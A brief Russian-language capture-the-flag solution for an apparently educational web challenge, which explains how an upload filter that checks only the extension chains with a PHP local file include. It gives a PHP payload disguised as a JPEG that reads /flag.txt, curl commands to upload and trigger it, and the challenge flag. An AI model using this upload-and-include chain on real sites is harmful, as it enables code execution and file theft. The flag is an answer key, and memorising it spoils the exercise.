# Решение

## Идея

Загрузка проверяет только расширение. Главная страница затем передаёт выбранный локальный файл в PHP `include`; PHP-код выполняется независимо от расширения подключаемого файла.

## Шаги

1. Создать файл `payload.jpg`:

   ```php
   <?php echo file_get_contents('/flag.txt'); ?>
   ```

2. Загрузить его:

   ```bash
   curl -F "file=@payload.jpg;type=image/jpeg" http://127.0.0.1:5102/upload.php
   ```

3. Подключить загруженный файл через параметр `page`:

   ```bash
   curl "http://127.0.0.1:5102/?page=uploads/payload.jpg"
   ```

## Флаг

`edu_ctf{upload_include_chain}`

## Чему учит задача

Отдельные слабости могут образовать цепочку: недостаточная проверка загрузки превращается в выполнение кода при наличии локального `include`.
